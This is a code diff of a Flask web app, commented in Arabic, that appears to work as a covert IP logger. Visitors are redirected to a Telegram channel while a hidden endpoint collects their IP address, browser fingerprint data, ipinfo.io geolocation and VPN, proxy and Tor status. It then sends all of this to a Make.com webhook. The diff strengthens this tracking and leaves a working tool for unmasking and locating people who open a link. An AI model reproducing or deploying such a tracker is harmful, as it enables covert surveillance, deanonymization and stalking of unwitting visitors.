@@ -7,7 +7,8 @@ import os
 app = Flask(__name__)
 
 REDIRECT_URL = "https://t.me/YourChannel"
-MAKE_WEBHOOK = os.environ.get("MAKE_WEBHOOK") or "https://hook.eu2.make.com/yplx3y98kpc1f8zzm6434nm36cfu0ego"
+MAKE_WEBHOOK = os.environ.get("MAKE_WEBHOOK") or "https://hook.eu2.make.com/xxxxxxx"
+IPINFO_TOKEN = os.environ.get("IPINFO_TOKEN") or "ضع_التوكن_الخاص_بك"
 
 @app.route('/')
 def home():
@@ -20,31 +21,36 @@ def track():
 
 @app.route('/collect', methods=['POST'])
 def collect():
-    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    js_data = request.get_json()
+    ip_raw = request.headers.get('X-Forwarded-For', request.remote_addr)
+    ip = ip_raw.split(",")[0].strip()
     user_agent = request.headers.get('User-Agent', '')
     language = request.headers.get('Accept-Language', '')
 
+    # تحليل بيانات ipinfo.io
     try:
-        js_data = request.get_json()
-        platform = js_data.get("platform", "")
-        timezone = js_data.get("timezone", "")
-        local_time = js_data.get("localTime", "")
-        screen = js_data.get("screen", "")
-    except:
-        platform = timezone = local_time = screen = ""
-
-    try:
-        geo = requests.get(f"https://ipinfo.io/{ip}/json").json()
-        country = geo.get("country", "N/A")
+        geo = requests.get(f"https://ipinfo.io/{ip}?token={IPINFO_TOKEN}", timeout=5).json()
         city = geo.get("city", "N/A")
         region = geo.get("region", "N/A")
+        country = geo.get("country", "N/A")
         org = geo.get("org", "N/A")
-        asn = geo.get("asn", "N/A")
-        postal = geo.get("postal", "N/A")
-    except Exception as e:
-        print("[Geo Error]", e)
-        country = city = region = org = asn = postal = "N/A"
 
+        privacy = geo.get("privacy", {})
+        is_vpn = privacy.get("vpn", False)
+        is_proxy = privacy.get("proxy", False)
+        is_tor = privacy.get("tor", False)
+
+    except Exception as e:
+        city = region = country = org = "N/A"
+        is_vpn = is_proxy = is_tor = False
+
+    # بيانات من JavaScript
+    platform = js_data.get("platform", "")
+    timezone = js_data.get("timezone", "")
+    local_time = js_data.get("localTime", "")
+    screen = js_data.get("screen", "")
+
+    # دمج البيانات
     data = {
         "ip": ip,
         "userAgent": user_agent,
@@ -59,13 +65,14 @@ def collect():
             "city": city,
             "region": region,
             "org": org,
-            "asn": asn,
-            "postal": postal,
+            "isVPN": is_vpn,
+            "isProxy": is_proxy,
+            "isTor": is_tor
         },
         "timestamp": datetime.now().isoformat()
     }
 
-    # إرسال إلى Webhook الخاص بـ Make
+    # إرسال إلى Make
     if MAKE_WEBHOOK:
         try:
             requests.post(MAKE_WEBHOOK, json=data, timeout=3)
@@ -79,7 +86,7 @@ def collect():
 def static_files(filename):
     return send_from_directory('static', filename)
 
-if __name__ == '__main__':
+if __name__ == '__main__': 
     port = int(os.environ.get("PORT", 10000))
     app.run(host='0.0.0.0', port=port)
- 
+
